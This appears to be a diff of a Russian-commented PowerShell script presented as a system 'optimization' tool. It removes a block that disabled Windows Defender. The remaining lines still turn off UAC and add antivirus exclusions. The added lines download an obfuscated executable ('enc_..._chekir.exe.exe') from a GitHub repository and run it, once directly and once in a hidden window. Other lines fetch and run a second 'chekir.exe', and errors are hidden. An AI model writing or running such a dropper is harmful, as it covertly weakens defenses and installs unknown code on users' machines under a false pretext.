@@ -1,35 +1,11 @@
-# --- БЛОК 1: ОТКЛЮЧЕНИЕ ЗАЩИТЫ WINDOWS DEFENDER ---
-
-# Отключаем защиту в реальном времени (самая главная)
-Write-Host "Отключение Realtime Monitoring..."
-Set-MpPreference -DisableRealtimeMonitoring $true
-
-# Отключаем поведенческую защиту (блокировку подозрительных действий программ)
-Write-Host "Отключение Behavior Monitoring..."
-Set-MpPreference -DisableBehaviorMonitoring $true
-
-# Отключаем сканирование всех загруженных файлов и вложений
-Write-Host "Отключение IOAV Protection..."
-Set-MpPreference -DisableIOAVProtection $true
-
-# Отключаем облачную защиту
-Write-Host "Отключение Cloud Block..."
-Set-MpPreference -DisableBlockAtFirstSeen $true
-
-# Отключаем сканирование сетевых файлов
-Write-Host "Отключение Network Scanning..."
-Set-MpPreference -DisableScanningNetworkFiles $true
-
-Write-Host "Защитник Windows успешно отключен." -ForegroundColor Green
-
-# --- БЛОК 2: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---
+# --- БЛОК 1: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---
 
 Write-Host "Отключение UAC..."
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0
 Write-Host "UAC отключен. Требуется перезагрузка для полного применения." -ForegroundColor Yellow
 
-# --- БЛОК 3: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---
+# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---
 
 # Добавляем папки в исключения, чтобы антивирус не мешал работе программ
 Write-Host "Добавление папок в исключения..."
@@ -171,6 +147,12 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 try {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
+
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
+    
+    # Запускаем
+    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
     
     # Скачиваем everything в текущую папку
     Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
@@ -188,6 +170,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
